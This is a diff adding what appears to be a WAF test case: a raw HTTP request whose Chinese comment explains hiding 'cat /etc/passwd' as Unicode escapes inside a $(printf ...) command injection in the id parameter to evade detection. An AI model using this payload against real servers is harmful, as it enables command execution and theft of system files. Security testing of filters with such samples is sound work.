@@ -1,0 +1,9 @@
+# 命令执行(Unicode编码绕过)
+# 将命令 cat /etc/passwd转换为Unicode字符串 \u0063\u0061\u0074\u0020\u002f\u0065\u0074\u0063\u002f\u0070\u0061\u0073\u0073\u0077\u0064 隐藏特征，利用linux命令还原unicode字符串并执行命令。
+GET /?id=$%28printf%22%5Cu0063%5Cu0061%5Cu0074%5Cu0020%5Cu002f%5Cu0065%5Cu0074%5Cu0063%5Cu002f%5Cu0070%5Cu0061%5Cu0073%5Cu0073%5Cu0077%5Cu0064%22%29&bid=hd_tag_m8mv25jw HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25jw
+RM-PRO-Token: 949643226342938c63a5f2ba8a7b6d40
+RM-PRO-Time: 1742808474916
+User-Agent: curl/7.83.1
+
